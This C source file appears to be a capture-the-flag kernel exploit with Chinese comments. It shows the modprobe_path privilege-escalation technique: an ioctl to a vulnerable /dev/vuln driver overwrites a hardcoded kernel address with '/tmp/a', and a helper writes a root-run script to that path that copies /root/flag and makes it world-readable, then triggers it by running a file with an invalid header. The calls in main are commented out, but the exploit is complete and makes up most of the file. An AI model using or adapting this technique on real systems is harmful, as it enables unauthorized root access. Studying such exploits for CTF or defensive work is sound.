#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

/* Macros
 * 定义辅助宏
 */
#define assert(cond) \
{ \
    if(!(cond)) \
    { \
        printf("Line:%d: '%s' assertion failed\n", \
               __LINE__, #cond); \
        perror(#cond); \
        fflush(stdout); \
        exit(1); \
    } \
}

/* Global variables
 * 定义使用到的全局变量
 */



/* modprobe_path提权
 * 条件:
 *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`
 * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f
 *
 * 参考: https://www.anquanke.com/post/id/232545#h3-6
 */
void modprobe_exp()
{
    printf("[*] set fake modprobe content\n");
    fflush(stdout);
    system("echo '#!/bin/sh' > /tmp/a");
    system("echo 'cp /root/flag /tmp/flag' >> /tmp/a");
    system("echo 'chmod 777 /tmp/flag' >> /tmp/a");


    printf("[*] set fake modprobe permission\n");
    fflush(stdout);
    system("chmod +x /tmp/a");


    printf("[*] set unknown file content\n");
    fflush(stdout);
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");


    printf("[*] set unknown file permission\n");
    fflush(stdout);
    system("chmod +x /tmp/dummy");


    printf("[*] run unknown file\n");
    fflush(stdout);
    system("/tmp/dummy");


    printf("[*] read the flag\n");
    fflush(stdout);
    system("cat /tmp/flag");
}


#define VULN_WRITE     1

typedef struct {
	long long *addr;
	long long val;
} Data;

int vuln_write(int fd, long long addr, long long val) {
    Data data = {
        addr: (long long*)addr,
        val: val,
    };

    return ioctl(fd, VULN_WRITE, &data);
}

int main(void)
{

    /* 尝试使用modprobe进行提权 */
    //int fd;
    //assert((fd = open("/dev/vuln", O_RDWR)) >= 0);

    //vuln_write(fd, 0xffffffff82851440, 0x612f706d742f);
    //modprobe_exp();


    /* 尝试使用modprobe进行提权 */
    return 0;
}
